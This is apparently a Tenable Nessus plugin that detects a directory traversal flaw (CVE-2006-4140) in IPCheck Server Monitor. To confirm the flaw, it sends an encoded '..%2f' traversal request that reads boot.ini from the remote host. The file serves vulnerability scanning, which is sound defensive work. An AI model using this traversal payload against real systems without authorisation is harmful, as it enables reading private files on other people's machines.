#
# (C) Tenable Network Security
#


  desc = "
Synopsis :

The remote web server is prone to a directory traversal attack. 

Description :

The remote host is running IPCheck Server Monitor, a network resource
monitoring tool for Windows. 

The installed version of IPCheck Server Monitor fails to filter
directory traversal sequences from requests that pass through web
server interface.  An attacker can exploit this issue to read
arbitrary files on the remote host subject to the privileges under
which the affected application runs. 

See also :

http://www.securityfocus.com/archive/1/442822/30/0/threaded
http://www.paessler.com/ipcheck/history
http://www.securityfocus.com/archive/1/444227/30/0/threaded

Solution :

Upgrade to IPCheck Server Monitor version 5.3.3.639/640 or later. 

Risk factor : 

Low / CVSS Base Score : 2.3
(AV:R/AC:L/Au:NR/C:P/I:N/A:N/B:N)";


if (description) {
  script_id(22205);
  script_version("$Revision: 1.4 $");

  script_cve_id("CVE-2006-4140");
  script_bugtraq_id(19473);

  script_name(english:"IPCheck Server Monitor Directory Traversal Vulnerability");
  script_summary(english:"Checks for directory traversal vulnerability in IPCheck Server Monitor");
 
  script_description(english:desc);

  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2006 Tenable Network Security");

  script_dependencies("http_version.nasl");
  script_require_ports("Services/www", 8080);

  exit(0);
}


include("http_func.inc");
include("http_keepalive.inc");


port = get_http_port(default:8080);
if (!get_port_state(port)) exit(0);


# Make sure it's IPCheck Server Monitor.
banner = get_http_banner(port:port);
if (!banner || "Server: IPCheck/" >!< banner) exit(0);


# Try to exploit the issue to read a local file.
file = "boot.ini";
req = http_get(item:string("/images%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f", file), port:port);
req = str_replace(
  string  : req,
  find    : string("Host: ", get_host_name()),
  replace : string("Host: ", get_host_ip())
);
res = http_keepalive_send_recv(port:port, data:req, bodyonly:TRUE);
if (res == NULL) exit(0);


# There's a problem if looks like boot.ini.
if ("[boot loader]">< res) {
  report = string(
    desc,
    "\n\n",
    "Plugin output :\n",
    "\n",
    "Here are the contents of the file '\\boot.ini' that Nessus was\n",
    "able to read from the remote host :\n",
    "\n",
    res
  );
  security_note(port:port, data:report);
}
